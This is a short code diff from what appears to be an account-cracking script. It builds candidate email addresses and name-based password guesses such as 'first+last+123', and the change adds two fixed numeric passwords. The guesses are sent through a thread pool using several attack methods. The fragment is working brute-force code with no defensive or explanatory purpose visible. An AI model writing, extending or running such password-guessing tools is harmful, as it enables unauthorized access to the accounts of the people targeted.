@@ -446,7 +446,7 @@ def gf2():
         print(led)
         for number in idf:
             idf = first+'.'+last+number+domain
-            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123'] 
+            pwv= [first+last,first+' '+last,first+last+'12',last,first+number,first+'123',first+'1234',first+last+'12',first+last+'123','57273200','59039200'] 
             if mthd in ['1','01']:king_xd.submit(m1,idf,pwv)
             elif mthd in ['2','02']:king_xd.submit(m2,idf,pwv)
             elif mthd in ['3','03']:king_xd.submit(m3,idf,pwv)
